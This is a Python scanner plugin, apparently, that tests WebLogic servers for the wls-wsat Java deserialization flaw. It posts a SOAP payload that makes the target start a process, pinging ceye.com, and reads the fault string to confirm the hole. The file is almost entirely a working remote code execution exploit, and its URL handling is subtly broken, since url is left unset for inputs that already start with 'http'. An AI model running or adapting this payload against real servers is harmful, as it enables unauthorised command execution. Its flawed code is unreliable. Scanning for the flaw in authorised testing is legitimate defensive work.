import requests
import re
from lib.verify import verify
from lib.random_header import HEADERS

vuln = ['weblogic', '7001']


def check(ip, ports, apps):
    if verify(vuln, ports, apps):
        if not ip.startswith("http"):
            url = "http://" + ip
        if "/" in url:
            url += '/wls-wsat/CoordinatorPortType'
        post_str = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
              <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                  <java>
                    <void class="java.lang.ProcessBuilder">
                      <array class="java.lang.String" length="2">
                        <void index="0">
                          <string>/usr/sbin/ping</string>
                        </void>
                        <void index="1">
                          <string>ceye.com</string>
                        </void>
                      </array>
                      <void method="start"/>
                    </void>
                  </java>
                </work:WorkContext>
              </soapenv:Header>
              <soapenv:Body/>
            </soapenv:Envelope>
            '''

        try:
            response = requests.post(url, data=post_str, verify=False, timeout=5, headers=HEADERS)
            response = response.text
            response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
        except Exception:
            response = ""

        if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
            return ('[+]weblogic has a JAVA deserialization vulnerability')
